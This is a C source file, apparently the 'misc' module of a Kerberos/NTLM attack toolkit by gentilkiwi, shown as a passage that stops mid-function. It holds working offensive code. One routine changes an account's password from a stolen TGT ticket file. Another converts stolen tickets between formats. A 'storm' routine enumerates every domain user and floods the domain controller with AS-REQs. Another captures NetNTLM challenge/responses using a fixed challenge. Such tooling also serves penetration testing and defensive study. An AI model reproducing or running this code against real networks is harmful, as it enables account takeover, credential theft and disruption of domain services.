/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kuhl_m_misc.h"

const KUHL_M_C kuhl_m_c_misc[] = {
	{kuhl_m_misc_changepw,	L"changepw",	L"Change user password (AoratoPw)"},
	{kuhl_m_misc_convert,	L"convert",		L"Convert tickets"},
	{kuhl_m_misc_storm,		L"storm",		L"Kerberos Storm!"},
	{kuhl_m_misc_arch,		L"arch",		L"Ask RPC for NDR64 support"},
	{kuhl_m_misc_netntlm,	L"netntlm",		L"Ask a local NetNTLM challenge/response"},
};
const KUHL_M kuhl_m_misc = {
	L"misc",	L"Miscellaneous module", NULL,
	ARRAYSIZE(kuhl_m_c_misc), kuhl_m_c_misc, NULL, NULL
};

NTSTATUS kuhl_m_misc_changepw(int argc, wchar_t * argv[])
{
	PCWSTR szData;
	PWSTR domain;
	PKULL_M_SOCK socket;

	KRB_CRED *KrbCred = NULL;
	EncKrbCredPart *encKrbCred = NULL;

	AP_REP *ApRep = NULL;
	KRB_PRIV *KrbPriv = NULL;
	EncKrbPrivPart *encKrbPrivPart = NULL;
	EncryptionKey authKey;
	UInt32 seq;

	OssBuf ApReq = {0, NULL}, KrbPrivReq = {0, NULL};
	USHORT version;
	_octet1 data;

	if(kull_m_string_args_byName(argc, argv, L"tgt", &szData, NULL))
	{
		kprintf(L"Ticket  : %s\n", szData);
		if(kull_m_kerberos_asn1_KrbCred_load(szData, NULL, &KrbCred, &encKrbCred))
		{
			if(domain = kull_m_string_qad_ansi_to_unicode(KrbCred->tickets->value.realm))
			{
				if(version = kull_m_kerberos_asn1_Authinfos_changepw(&data, argc, argv, KrbCred->tickets->value.realm))
				{
					if(kull_m_kerberos_asn1_ApReq_build(&ApReq, &encKrbCred->ticket_info->value.pname, encKrbCred->ticket_info->value.prealm, &KrbCred->tickets->value, &encKrbCred->ticket_info->value.key, KRB_KEY_USAGE_AP_REQ_AUTHENTICATOR, &authKey, &seq))
					{
						if(kull_m_kerberos_asn1_KrbPriv_build(&data, &authKey, "wtf", &KrbPrivReq, &seq))
						{
							if(socket = kull_m_kerberos_asn1_net_AddressSocket_create(domain, KPASSWD_DEFAULT_PORT, argc, argv, TRUE))
							{
								if(kull_m_kerberos_asn1_net_callKadminOssBuf(socket, version, &ApReq, &KrbPrivReq, &ApRep, &KrbPriv))
								{
									if(kull_m_kerberos_asn1_EncKrbPrivPart_from_Priv_build(KrbPriv, &encKrbPrivPart, &authKey))
									{
										kprintf(L"[changepw] ");
										kull_m_kadmin_passwd_retFromKadmin(&encKrbPrivPart->user_data);
										ossFreePDU(&kull_m_kerberos_asn1_world, EncKrbPrivPart_PDU, encKrbPrivPart);
									}
									ossFreePDU(&kull_m_kerberos_asn1_world, KRB_PRIV_PDU, KrbPriv);
									ossFreePDU(&kull_m_kerberos_asn1_world, AP_REP_PDU, ApRep);
								}
								kull_m_kerberos_asn1_net_AddressSocket_delete(socket);
							}
							ossFreeBuf(&kull_m_kerberos_asn1_world, KrbPrivReq.value);
						}
						if(authKey.keyvalue.value)
							LocalFree(authKey.keyvalue.value);
						ossFreeBuf(&kull_m_kerberos_asn1_world, ApReq.value);
					}
					LocalFree(data.value);
				}
			}
			ossFreePDU(&kull_m_kerberos_asn1_world, EncKrbCredPart_PDU, encKrbCred);
			ossFreePDU(&kull_m_kerberos_asn1_world, KRB_CRED_PDU, KrbCred);
		}
	}
	else PRINT_ERROR(L"A TGT is needed ( /tgt:filename.kirbi )\n");
	return STATUS_SUCCESS;
}

const KULL_M_KADMIN_PASSWD_ERR kull_m_kadmin_passwd_err[] = {
	{0,	L"KRB5_KPASSWD_SUCCESS"},
	{1,	L"KRB5_KPASSWD_MALFORMED"},
	{2,	L"KRB5_KPASSWD_HARDERROR"},
	{3,	L"KRB5_KPASSWD_AUTHERROR"},
	{4,	L"KRB5_KPASSWD_SOFTERROR"},
	{5,	L"KRB5_KPASSWD_ACCESSDENIED"},
	{6,	L"KRB5_KPASSWD_BAD_VERSION"},
	{7,	L"KRB5_KPASSWD_INITIAL_FLAG_NEEDED"},
};
PCWSTR kull_m_kadmin_passwd_err_to_string(DWORD id)
{
	DWORD i;
	for(i = 0; i < ARRAYSIZE(kull_m_kadmin_passwd_err); i++)
		if(kull_m_kadmin_passwd_err[i].id == id)
			return kull_m_kadmin_passwd_err[i].name;
	return L"ERROR ?";
}

void kull_m_kadmin_passwd_retFromKadmin(_octet1 * data)
{
	WORD code;
	if(data->length >= 2)
	{
		if(code = _byteswap_ushort(*(PWORD) data->value))
			kprintf(L"%s (%u)", kull_m_kadmin_passwd_err_to_string(code), code);
		else kprintf(L"OK");
		if(data->length > 2)
		{
			kprintf(L" - {");
			kull_m_string_wprintf_hex(data->value + 2, data->length - 2, 0);
			kprintf(L"}");
		}
		kprintf(L"\n");
	}
	else PRINT_ERROR(L"Size\n");
}

const KERB_FORMAT_MODULE modules[] = {
	{L"MIT Credential Cache", kiwi_ccache_valid_header, kiwi_ccache_read, kiwi_ccache_write, L"ccache", L"ccaches"},
	{L"RFC KRB-CRED (#22)", kiwi_krbcred_valid_header, kiwi_krbcred_read, kiwi_krbcred_write, L"kirbi", L"kirbis"},
	{L"WCE \'windows wce\'", kiwi_wce_valid_header, kiwi_wce_read, kiwi_wce_write, L"wce", L"wces"},
	{L"Microsoft LSA API", NULL, NULL, kiwi_lsa_write, NULL, L"lsa"},
};
NTSTATUS kuhl_m_misc_convert(int argc, wchar_t * argv[])
{
	DWORD i, j;
	KERB_FORMAT_MODULE const * readModule, * writeModule;
	OssBuf input, output = {0, NULL};
	KRB_CRED *cred = NULL, *dst = NULL;
	BOOL explodeIt;

	if(argc > 1)
	{
		writeModule = NULL;
		for(j = 0; j < ARRAYSIZE(modules); j++)
		{
			if(modules[j].simpleName && !_wcsicmp(modules[j].simpleName, argv[0]))
			{
				writeModule = &modules[j];
				explodeIt = FALSE;
				break;
			}
			else if(modules[j].multiName && !_wcsicmp(modules[j].multiName, argv[0]))
			{
				writeModule = &modules[j];
				explodeIt = TRUE;
				break;
			}
		}

		if(writeModule)
		{
			kprintf(L"Destination : %s (%s)\n", writeModule->shortName, explodeIt ? L"multiple" : L"simple");
			for(i = 1; i < (DWORD) argc ; i++)
			{
				kprintf(L" < %s ", argv[i]);
				if(kull_m_file_readData(argv[i], &input.value, (PDWORD) &input.length))
				{
					readModule = NULL;
					for(j = 0; j < ARRAYSIZE(modules); j++)
					{
						if(modules[j].validHeader)
						{
							if(modules[j].validHeader(&input))
							{
								readModule = &modules[j];
								break;
							}
						}
					}

					if(readModule)
					{
						kprintf(L"(%s) ", readModule->shortName);
						if(readModule->readData && readModule->readData(&input, &cred))
						{
							addCred(cred, &dst);
							ossFreePDU(&kull_m_kerberos_asn1_world, KRB_CRED_PDU, cred);
						}
						else kprintf(L": error when reading!");
					}
					else kprintf(L": format not recognized!");
					kprintf(L"\n");
					LocalFree(input.value);
				}
				else PRINT_ERROR_AUTO(L"kull_m_file_readData");
			}

			if(dst)
			{
				writeData(writeModule, explodeIt, dst);
				ossFreePDU(&kull_m_kerberos_asn1_world, KRB_CRED_PDU, dst);
			}
		}
	}
	else PRINT_ERROR(L"Arguments missing! kirbi|ccache|wce|lsa|kirbis|ccaches|wces ticket1 [ticket2] [...]\n");
	return STATUS_SUCCESS;
}

// globals for performances
LIST_ENTRY gUserList = {&gUserList, &gUserList};
PSTR gDomain;
NTSTATUS kuhl_m_misc_storm(int argc, wchar_t * argv[])
{
	BOOL sockError = FALSE;
	DWORD retry, i, total, dataOutSize;
	IPPROTO mode = IPPROTO_TCP;
	PBERVAL pBerVal = NULL;
	KULL_M_SOCK fullsocket;
	PVOID dataOut;
	PKIWI_USERNAMEA entry, tmp;
	FILETIME fTime;
	LPCWSTR szDc, szDomain, szNum;

	if(kull_m_string_args_byName(argc, argv, L"dc", &szDc, NULL) && kull_m_string_args_byName(argc, argv, L"domain", &szDomain, NULL))
	{
		gDomain = kull_m_string_unicode_to_ansi(szDomain);
		
		kull_m_string_args_byName(argc, argv, L"retry", &szNum, L"20");
		retry = wcstoul(szNum, NULL, 0);
		kprintf(L"DC name    : %s\nDomain FQDN: %s\nLogon retry: %u\nMode       : ", szDc, szDomain, retry);
		if(kull_m_string_args_byName(argc, argv, L"udp", NULL, NULL))
		{
			mode = IPPROTO_UDP;
			kprintf(L"UDP");
		}
		else kprintf(L"TCP");

		GetSystemTimeAsFileTime(&fTime); kprintf(L"\n> Retrieving user list : "); kull_m_string_displayLocalFileTime(&fTime); kprintf(L"\n");
		if(total = kuhl_m_misc_storm_giveUsersForServer(szDc))
		{
			GetSystemTimeAsFileTime(&fTime); kprintf(L"> End of user list     : "); kull_m_string_displayLocalFileTime(&fTime); kprintf(L"\n");
			if(kull_m_sock_init_addr_protocol(szDc, NULL, KERBEROS_DEFAULT_PORT, mode, &fullsocket))
			{
				if(kull_m_sock_connect(&fullsocket))
				{
					GetSystemTimeAsFileTime(&fTime); kprintf(L"> Sending AS-REQ       : "); kull_m_string_displayLocalFileTime(&fTime); kprintf(L"\n");
					for(entry = (PKIWI_USERNAMEA) gUserList.Flink; !sockError && (entry != (PKIWI_USERNAMEA) &gUserList); entry = (PKIWI_USERNAMEA) entry->navigator.Flink)
					{
						if(pBerVal = kuhl_m_misc_storm_giveBERForUser(&entry->username))
						{
							for(i = 0; !sockError && (i < retry); i++)
							{
								if(kull_m_kerberos_asn1_net_SendAndRecv(&fullsocket, pBerVal->bv_val, pBerVal->bv_len, &dataOut, &dataOutSize))
									LocalFree(dataOut);
								else sockError = TRUE;
							}
							ber_bvfree(pBerVal);
						}
					}
					GetSystemTimeAsFileTime(&fTime); kprintf(L"> End of AS-REQ        : "); kull_m_string_displayLocalFileTime(&fTime); kprintf(L"\n");
				}
				kull_m_sock_termSocket(&fullsocket);
			}

			GetSystemTimeAsFileTime(&fTime); kprintf(L"> Free user list       : "); kull_m_string_displayLocalFileTime(&fTime); kprintf(L"\n");
			for(entry = (PKIWI_USERNAMEA) gUserList.Flink; entry != (PKIWI_USERNAMEA) &gUserList; entry = tmp)
			{
				tmp = (PKIWI_USERNAMEA) entry->navigator.Flink;
				RtlFreeAnsiString(&entry->username);
				LocalFree(entry);
			}
			gUserList.Blink = gUserList.Flink = &gUserList;
			GetSystemTimeAsFileTime(&fTime); kprintf(L"> End of user list     : "); kull_m_string_displayLocalFileTime(&fTime); kprintf(L"\n");
		}
		else PRINT_ERROR(L"unable to get users\n");

		LocalFree(gDomain);
	}
	else PRINT_ERROR(L"/dc:<dc.fqdn.local> /domain:<fqdn.local> required\n");
	return STATUS_SUCCESS;
}

BOOL kuhl_m_misc_storm_add(PCUNICODE_STRING name)
{
	BOOL status = FALSE;
	PKIWI_USERNAMEA ua;
	if(ua = (PKIWI_USERNAMEA) LocalAlloc(LPTR, sizeof(KIWI_USERNAMEA)))
	{
		ua->navigator.Blink = gUserList.Blink;
		ua->navigator.Flink = &gUserList;
		((PKIWI_USERNAMEA) gUserList.Blink)->navigator.Flink = (PLIST_ENTRY) ua;
		gUserList.Blink= (PLIST_ENTRY) ua;
		status = NT_SUCCESS(RtlUnicodeStringToAnsiString(&ua->username, name, TRUE));
	}
	return status;
}

const BYTE
	reqFlags[] = {0x00, 0x40, 0x80, 0x00, 0x10},
	nullPATS[] = {0x30, 0x36, 0xa0, 0x03, 0x02, 0x01, 0x17, 0xa2, 0x2f, 0x04, 0x2d, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
PBERVAL kuhl_m_misc_storm_giveBERForUser(PCANSI_STRING user)
{
	BerElement *pBer;
	PBERVAL pBerVal = NULL;
	if(pBer = ber_alloc_t(LBER_USE_DER))
	{
		ber_printf(pBer,"t{{"
							"t{i}"
								"t{i}"
								"t{{"
									"{t{i}t{o}}"
								"}}"
							"t{{"
								"t{X}"
								"t{{t{i}t{{to}}}}"
								"t{ts}"
								"t{{t{i}t{{tsts}}}}"
								"t{ts}"
								"t{i}"
								"t{{i}}"
							"}}"
						"}}",
						MAKE_APP_TAG(10),
							MAKE_CTX_TAG(1), 5,
							MAKE_CTX_TAG(2), 10,
							MAKE_CTX_TAG(3),
								MAKE_CTX_TAG(1), 2, MAKE_CTX_TAG(2), nullPATS, sizeof(nullPATS),
							MAKE_CTX_TAG(4),
								MAKE_CTX_TAG(0), reqFlags, sizeof(reqFlags),
								MAKE_CTX_TAG(1), MAKE_CTX_TAG(0), KRB_NT_PRINCIPAL, MAKE_CTX_TAG(1), DIRTY_ASN1_ID_GENERAL_STRING, user->Buffer, user->Length,
								MAKE_CTX_TAG(2), DIRTY_ASN1_ID_GENERAL_STRING, gDomain,
								MAKE_CTX_TAG(3), MAKE_CTX_TAG(0), KRB_NT_SRV_INST, MAKE_CTX_TAG(1), DIRTY_ASN1_ID_GENERAL_STRING, "krbtgt", DIRTY_ASN1_ID_GENERAL_STRING, gDomain,
								MAKE_CTX_TAG(5), DIRTY_ASN1_ID_GENERALIZED_TIME, "20370913024805Z",
								MAKE_CTX_TAG(7), MIMIKATZ_NONCE,
								MAKE_CTX_TAG(8), KERB_ETYPE_RC4_HMAC_NT
					);
		if(ber_flatten(pBer, &pBerVal) < 0)
			PRINT_ERROR(L"ber_flatten for %Z@%S\n", user, gDomain);
		ber_free(pBer, 1);
	}
	return pBerVal;
}

DWORD kuhl_m_misc_storm_giveUsersForServer(PCWSTR server)
{
	NTSTATUS status, enumDomainStatus, enumUserStatus;
	UNICODE_STRING serverName;
	SAMPR_HANDLE hServerHandle, hDomainHandle;
	DWORD i, j, domainEnumerationContext = 0, domainCountRetourned, userEnumerationContext, userCountRetourned, totalUsers = 0;
	PSAMPR_RID_ENUMERATION pEnumDomainBuffer, pEnumUsersBuffer;
	PSID domainSid;

	RtlInitUnicodeString(&serverName, server);
	status = SamConnect(&serverName, &hServerHandle, SAM_SERVER_CONNECT | SAM_SERVER_ENUMERATE_DOMAINS | SAM_SERVER_LOOKUP_DOMAIN, FALSE);
	if(NT_SUCCESS(status))
	{
		do
		{
			enumDomainStatus = SamEnumerateDomainsInSamServer(hServerHandle, &domainEnumerationContext, &pEnumDomainBuffer, 1, &domainCountRetourned);
			if(NT_SUCCESS(enumDomainStatus) || enumDomainStatus == STATUS_MORE_ENTRIES)
			{
				for(i = 0; i < domainCountRetourned; i++)
				{
					status = SamLookupDomainInSamServer(hServerHandle, &pEnumDomainBuffer[i].Name, &domainSid);
					if(NT_SUCCESS(status))
					{
						if(((PISID) domainSid)->SubAuthorityCount && (((PISID) domainSid)->SubAuthority[0] == SECURITY_BUILTIN_DOMAIN_RID))
							continue;
						kprintf(L"Domain name : %wZ\n", &pEnumDomainBuffer[i].Name);
						kprintf(L"Domain SID  : "); kull_m_string_displaySID(domainSid); kprintf(L"\n");
						status = SamOpenDomain(hServerHandle, DOMAIN_LIST_ACCOUNTS, domainSid, &hDomainHandle);
						if(NT_SUCCESS(status))
						{
							userEnumerationContext = 0;
							do
							{
								enumUserStatus = SamEnumerateUsersInDomain(hDomainHandle, &userEnumerationContext, USER_NORMAL_ACCOUNT, &pEnumUsersBuffer, 4*1024*1024, &userCountRetourned);
								if(NT_SUCCESS(enumUserStatus) || enumUserStatus == STATUS_MORE_ENTRIES)
								{
									totalUsers += userCountRetourned;
									for(j = 0; j < userCountRetourned; j++) 
										kuhl_m_misc_storm_add(&pEnumUsersBuffer[j].Name);
									SamFreeMemory(pEnumUsersBuffer);
								}
								else PRINT_ERROR(L"SamEnumerateUsersInDomain %08x", enumUserStatus);
							}
							while(enumUserStatus == STATUS_MORE_ENTRIES);
							kprintf(L"Total       : %u\n", totalUsers);
							SamCloseHandle(hDomainHandle);
						}
						else PRINT_ERROR(L"SamOpenDomain %08x", status);
						SamFreeMemory(domainSid);
					}
					else PRINT_ERROR(L"SamLookupDomainInSamServer %08x", status);
				}
				SamFreeMemory(pEnumDomainBuffer);
			}
			else PRINT_ERROR(L"SamEnumerateDomainsInSamServer %08x\n", enumDomainStatus);
		}
		while(enumDomainStatus == STATUS_MORE_ENTRIES);
		SamCloseHandle(hServerHandle);
	}
	return totalUsers;
}

NTSTATUS kuhl_m_misc_arch(int argc, wchar_t * argv[])
{
	KULL_M_SOCK sock;
	PCWCHAR server = argc ? argv[0] : L"localhost";
	DWORD cbOut;
	prpcconn_bind_ack_hdr_t binda = NULL;
	pp_result_list_t list = NULL;
	static const rpcconn_bind_hdr_t bindr = {
		5, 0,
		RPC_PDU_bind,
		0x02 | 0x01,
		0x00000010,
		sizeof(rpcconn_bind_hdr_t),
		0,
		2,
		5840, 5840,
		0,
		{
			1,
			0, 0,
			{
				{
					0,
					1,
					0,
					{{0xe1af8308, 0x5d1f, 0x11c9, {0x91, 0xa4, 0x08, 0x00, 0x2b, 0x14, 0xa0, 0xfa}}, {3, 0}}, // AbstractSyntax EPMv4 v3.0
					{
						{{0x71710533, 0xbeba, 0x4937, {0x83, 0x19, 0xb5, 0xdb, 0xef, 0x9c, 0xcc, 0x36}}, {1, 0}} // TransferSyntax NDR64 v1.0
					}
				}
			}
		}
	};

	kprintf(L"Server      : %s\n", server);
	if(kull_m_sock_init_addr_protocol(server, NULL, 135, IPPROTO_TCP, &sock))
	{
		if(kull_m_sock_connect(&sock))
		{
			if(kull_m_sock_SendAndRecv(&sock, &bindr, bindr.frag_length, (LPVOID *) &binda, &cbOut))
			{
				if(cbOut > (DWORD) FIELD_OFFSET(rpcconn_bind_ack_hdr_t, max_xmit_frag))
				{
					if(binda->PTYPE == RPC_PDU_bind_ack)
					{
						list = (pp_result_list_t) ((PBYTE) &binda->sec_addr + SIZE_ALIGN(FIELD_OFFSET(port_any_t, port_spec) + binda->sec_addr.length, 4));
						if(list->n_results == 1)
						{
							if(list->p_results[0].result == RPC_CONT_DEF_RESULT_acceptance)
								kprintf(L"Architecture: x64\n");
							else if((list->p_results[0].result == RPC_CONT_DEF_RESULT_provider_rejection) && (list->p_results[0].reason == RPC_PROVIDER_REASON_proposed_transfer_syntaxes_not_supported))
								kprintf(L"Architecture: x86\n");
							else PRINT_ERROR(L"Result: %u -- Reason: %u\n", (DWORD) list->p_results[0].result, (DWORD) list->p_results[0].reason);
						}
						else PRINT_ERROR(L"n_results: %u\n", (DWORD) list->n_results);
					}
					else PRINT_ERROR(L"PTYPE: %u\n", (DWORD) binda->PTYPE);
				}
				else PRINT_ERROR(L"Size is not valid (%u)\n", cbOut);
				LocalFree(binda);
			}
		}
		kull_m_sock_termSocket(&sock);
	}
	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_misc_netntlm(int argc, wchar_t * argv[])
{
	KIWI_NTLM_CHALLENGE_MESSAGE littleChallenge = {NTLMSSP_Signature_ULL, NTLMSSP_TypeTwoMessage,
		{0, 0, FIELD_OFFSET(KIWI_NTLM_CHALLENGE_MESSAGE, Payload)},
		NTLMSSP_NEGOTIATE_VERSION | NTLMSSP_NEGOTIATE_NTLM | NTLMSSP_NEGOTIATE_UNICODE,
		{0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88},
		{0},
		{0, 0, FIELD_OFFSET(KIWI_NTLM_CHALLENGE_MESSAGE, Payload)},
		{6, 1, 7601, {0}, 15},
	};
	SECURITY_STATUS status;
	CredHandle Credentials;
	TimeStamp CredentialsExpiry, SecurityContextExpiry;
	CtxtHandle NewContext = {0};
	SecBuffer
		InBuff = {FIELD_OFFSET(KIWI_NTLM_CHALLENGE_MESSAGE, Payload), SECBUFFER_TOKEN, &littleChallenge},
		OutBuff = {0, SECBUFFER_TOKEN, NULL},
		Out2Buff = {0, SECBUFFER_TOKEN, NULL};
	SecBufferDesc Output = {SECBUFFER_VERSION, 1, &OutBuff}, Input = {SECBUFFER_VERSION, 1, &InBuff}, Output2 = {SECBUFFER_VERSION, 1, &Out2Buff};
	ULONG ContextAttr;

	if(kull_m_string_args_byName(argc, argv, L"ess", NULL, NULL))
		littleChallenge.NegotiateFlags |= NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY;
	status = AcquireCredentialsHandle(NULL, L"NTLM", SECPKG_CRED_OUTBOUND, NULL, NULL, NULL, NULL, &Credentials, &CredentialsExpiry);
	if(status == SEC_E_OK)
	{
		kprintf(L"NEGOTIATE   :\n");
		status = InitializeSecurityContext(&Credentials, NULL, NULL, ISC_REQ_CONNECTION | ISC_REQ_ALLOCATE_MEMORY, 0, SECURITY_NATIVE_DREP, NULL, 0, &NewContext, &Output, &ContextAttr, &SecurityContextExpiry);
		if(status == SEC_I_CONTINUE_NEEDED)
		{
			kuhl_m_misc_netntlm_descrNegotiate(&Output);
			kprintf(L"CHALLENGE   :\n");
			kuhl_m_misc_netntlm_descrChallenge(&Input);
			kprintf(L"AUTHENTICATE:\n"); 
			status = InitializeSecurityContext(&Credentials, &NewContext, NULL, ISC_REQ_CONNECTION | ISC_REQ_ALLOCATE_MEMORY, 0, SECURITY_NATIVE_DREP, &Input, 0, &NewContext, &Output2, &ContextAttr, &SecurityContextExpiry);
			if(status == SEC_E_OK)
			{
				kuhl_m_misc_netntlm_descrAuthenticate(&Output2);
				FreeContextBuffer(Out2Buff.pvBuffer);
			}
			else PRINT_ERROR(L"InitializeSecurityContext(2/2): 0x%08x\n", status);
			FreeContextBuffer(OutBuff.pvBuffer);
		}
		else PRINT_ERROR(L"InitializeSecurityContext(1/2): 0x%08x\n", status);
		FreeCredentialHandle(&Credentials);
	}
	else PRINT_ERROR(L"AcquireCredentialsHandle: 0x%08x\n", status);
	return STATUS_SUCCESS;
}

const PCWCHAR KIWI_NEGOTIATE_FLAGS[] = {
	L"UNICODE", L"OEM", L"ReqTARGET", L"RESERVED_10",
	L"SIGN", L"SEAL", L"DATAGRAM", L"LM_KEY",
	L"RESERVED_9", L"NTLM", L"RESERVED_8", L"ANONYMOUS",
	L"OEM_DOMAIN_SUPPLIED", L"OEM_WORKSTATION_SUPPLIED", L"RESERVED_7", L"ALWAYS_SIGN", 
	L"TARGET_TYPE_DOMAIN", L"TARGET_TYPE_SERVER", L"TARGET_TYPE_SHARE", L"EXTENDED_SESSIONSECURITY", 
	L"IDENTIFY", L"RESERVED_5", L"ReqNON_NT_SESSION_KEY", L"TARGET_INFO", 
	L"RESERVED_4", L"VERSION", L"RESERVED_3", L"RESERVED_2", 
	L"RESERVED_1", L"128", L"KEY_EXCH", L"56",
};

void kuhl_m_misc_netntlm_descrNegotiateFlags(ULONG flags)
{
	BYTE i;
	kprintf(L"0x%08x ( ", flags);
	for(i = 0; i < sizeof(ULONG) * 8; i++)
		if((flags >> i) & 1)
			kprintf(L"%s ", KIWI_NEGOTIATE_FLAGS[i]);
	kprintf(L")\n");
}

void kuhl_m_misc_netntlm_descrAuthenticate(PSecBufferDesc buff)
{
	PKIWI_NTLM_AUTHENTICATE_MESSAGE pAuth = (PKIWI_NTLM_AUTHENTICATE_MESSAGE) buff->pBuffers[0].pvBuffer;
	PKIWI_NTLM_LMv2_RESPONSE pLMv2;
	PKIWI_NTLM_NTLMv2_RESPONSE pNTLMv2;
	PKIWI_NTLM_LM_RESPONSE pLMv1;
	PKIWI_NTLM_NTLM_RESPONSE pNTLMv1;

	kprintf(L"  NegotiateFlags: ");
	kuhl_m_misc_netntlm_descrNegotiateFlags(pAuth->NegotiateFlags);
	kprintf(L"  DomainName    : ");
	if(pAuth->DomainNameFields.Len)
		kprintf(L"%.*s\n", pAuth->DomainNameFields.Len / sizeof(wchar_t), (PBYTE) pAuth + pAuth->DomainNameFields.Offset);
	else kprintf(L"<NULL>\n");
	kprintf(L"  UserName      : ");
	if(pAuth->UserNameFields.Len)
		kprintf(L"%.*s\n", pAuth->UserNameFields.Len / sizeof(wchar_t), (PBYTE) pAuth + pAuth->UserNameFields.Offset);
	else kprintf(L"<NULL>\n");
	kprintf(L"  Workstation   : ");
	if(pAuth->WorkstationFields.Len)
		kprintf(L"%.*s\n", pAuth->WorkstationFields.Len / sizeof(wchar_t), (PBYTE) pAuth + pAuth->WorkstationFields.Offset);
	else kprintf(L"<NULL>\n");
	if(pAuth->NegotiateFlags & NTLMSSP_NEGOTIATE_KEY_EXCH)
	{
		kprintf(L"  SessionKey    : ");
		if(pAuth->EncryptedRandomSessionKeyFields.Len)
			kull_m_string_wprintf_hex((PBYTE) pAuth + pAuth->EncryptedRandomSessionKeyFields.Offset, pAuth->EncryptedRandomSessionKeyFields.Len, 0);
		else kprintf(L"<NULL>");
		kprintf(L"\n");
	}
	if(pAuth->NegotiateFlags & NTLMSSP_NEGOTIATE_VERSION)
		kprintf(L"  Version       : %hhu.%hhu (%hu) - rev. %hhu\n", pAuth->Version.ProductMajorVersion, pAuth->Version.ProductMinorVersion, pAuth->Version.ProductBuild, pAuth->Version.NTLMRevisionCurrent);
	if((MIMIKATZ_NT_BUILD_NUMBER > 3790) || (pAuth->Version.ProductBuild > 3790))
	{
		kprintf(L"  MIC           : ");
		kull_m_string_wprintf_hex(pAuth->MIC, sizeof(pAuth->MIC), 0);
		kprintf(L"\n");
	}
	if(pAuth->NtChallengeResponseFields.Len >= sizeof(KIWI_NTLM_NTLMv2_RESPONSE))
	{
		if(pAuth->LmChallengeResponseFields.Len == sizeof(KIWI_NTLM_LMv2_RESPONSE))
		{
			pLMv2 = (PKIWI_NTLM_LMv2_RESPONSE) ((PBYTE) pAuth + pAuth->LmChallengeResponseFields.Offset);
			kprintf(L"  LMv2:\n");
			kprintf(L"    Response       : ");
			kull_m_string_wprintf_hex(pLMv2->Response, sizeof(pLMv2->Response), 0);
			kprintf(L"\n");
			kprintf(L"    ClientChallenge: ");
			kull_m_string_wprintf_hex(pLMv2->ChallengeFromClient, sizeof(pLMv2->ChallengeFromClient), 0);
			kprintf(L"\n");
		}
		pNTLMv2 = (PKIWI_NTLM_NTLMv2_RESPONSE) ((PBYTE) pAuth + pAuth->NtChallengeResponseFields.Offset);
		kprintf(L"  NTLMv2:\n");
		kprintf(L"    Response       : ");
		kull_m_string_wprintf_hex(pNTLMv2->Response, sizeof(pNTLMv2->Response), 0);
		kprintf(L"\n");
		kprintf(L"    ClientChallenge: ");
		kull_m_string_wprintf_hex(pNTLMv2->ClientChallenge.ChallengeFromClient, sizeof(pNTLMv2->ClientChallenge.ChallengeFromClient), 0);
		kprintf(L"\n");
		kprintf(L"    TimeStamp      : ");
		kull_m_string_displayLocalFileTime(&pNTLMv2->ClientChallenge.TimeStamp);
		kprintf(L"\n");
	}
	else if(pAuth->NtChallengeResponseFields.Len == sizeof(KIWI_NTLM_NTLM_RESPONSE))
	{
		if(pAuth->LmChallengeResponseFields.Len == sizeof(KIWI_NTLM_LM_RESPONSE))
		{
			pLMv1 = (PKIWI_NTLM_LM_RESPONSE) ((PBYTE) pAuth + pAuth->LmChallengeResponseFields.Offset);
			kprintf(L"  LMv1:\n");
			if(pAuth->NegotiateFlags & NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY)
			{
				kprintf(L"    NTLM2 ESS      : ");
				kull_m_string_wprintf_hex(pLMv1->Response, 8, 0);
			}
			else
			{			
				kprintf(L"    Response       : ");
				kull_m_string_wprintf_hex(pLMv1->Response, sizeof(pLMv1->Response), 0);
			}
			kprintf(L"\n");
		}
		pNTLMv1 = (PKIWI_NTLM_NTLM_RESPONSE) ((PBYTE) pAuth + pAuth->NtChallengeResponseFields.Offset);
		kprintf(L"  NTLMv1:\n");
		kprintf(L"    Response       : ");
		kull_m_string_wprintf_hex(pNTLMv1->Response, sizeof(pNTLMv1->Response), 0);
		kprintf(L"\n");
	}
	else PRINT_ERROR(L"NtChallengeResponseFields.Len = %hu\n", pAuth->NtChallengeResponseFields.Len);
}

void kuhl_m_misc_netntlm_descrChallenge(PSecBufferDesc buff)
{
	PKIWI_NTLM_CHALLENGE_MESSAGE pChal = (PKIWI_NTLM_CHALLENGE_MESSAGE) buff->pBuffers[0].pvBuffer;
	kprintf(L"  NegotiateFlags: ");
	kuhl_m_misc_netntlm_descrNegotiateFlags(pChal->NegotiateFlags);
	kprintf(L"  Challenge     : "); kull_m_string_wprintf_hex(pChal->Challenge, sizeof(pChal->Challenge), 0); kprintf(L"\n");
	if(pChal->NegotiateFlags & NTLMSSP_REQUEST_TARGET)
	{
		kprintf(L"  TargetName    : (%hu)\n", pChal->TargetNameFields.Len);
		kull_m_string_wprintf_hex((PBYTE) pChal + pChal->TargetNameFields.Offset, pChal->TargetNameFields.Len, 1 | (16 << 16));
		kprintf(L"\n");
	}
	if(pChal->NegotiateFlags & NTLMSSP_NEGOTIATE_TARGET_INFO)
	{
		kprintf(L"  TargetInfo    : (%hu)\n", pChal->TargetInfoFields.Len);
		kull_m_string_wprintf_hex((PBYTE) pChal + pChal->TargetInfoFields.Offset, pChal->TargetInfoFields.Len, 1 | (16 << 16));
		kprintf(L"\n");
	}
	if(pChal->NegotiateFlags & NTLMSSP_NEGOTIATE_VERSION)
		kprintf(L"  Version       : %hhu.%hhu (%hu) - rev. %hhu\n", pChal->Version.ProductMajorVersion, pChal->Version.ProductMinorVersion, pChal->Version.ProductBuild, pChal->Version.NTLMRevisionCurrent);
}

void kuhl_m_misc_netntlm_descrNegotiate(PSecBufferDesc buff)
{
	PKIWI_NTLM_NEGOTIATE_MESSAGE pNeg = (PKIWI_NTLM_NEGOTIATE_MESSAGE) buff->pBuffers[0].pvBuffer;
